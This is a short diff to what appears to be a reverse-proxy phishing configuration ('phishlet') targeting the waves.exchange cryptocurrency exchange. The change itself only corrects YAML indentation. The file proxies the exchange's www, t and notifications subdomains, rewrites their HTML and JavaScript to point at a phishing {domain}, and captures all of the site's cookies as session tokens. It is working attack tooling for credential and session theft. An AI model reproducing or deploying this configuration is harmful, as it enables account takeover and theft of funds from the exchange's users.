@@ -5,11 +5,11 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'waves.exchange', session: true, is_landing: true, auto_filter: false}
   - {phish_sub: 't', orig_sub: 't', domain: 'waves.exchange', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'notifications', orig_sub: 'notifications', domain: 'waves.exchange', session: false, is_landing: false, auto_filter: false}
-  sub_filters:
+sub_filters:
   - {triggers_on: 'www.waves.exchange', orig_sub: 'www', domain: 'waves.exchange', search: 'www.waves.exchange', replace: 'www.{domain}', mimes: ['text/html', 'text/javascript']}
   - {triggers_on: 'www.waves.exchange', orig_sub: 'www', domain: 'waves.exchange', search: 't.waves.exchange', replace: 't.{domain}', mimes: ['text/html', 'text/javascript']}
   - {triggers_on: 'www.waves.exchange', orig_sub: 'www', domain: 'waves.exchange', search: 'notifications.waves.exchange', replace: 'notifications.{domain}', mimes: ['text/html', 'text/javascript']}
-  auth_tokens:
+auth_tokens:
   - domain: '.waves.exchange'
     keys: ['.*,regexp']
   - domain: 'www.waves.exchange'
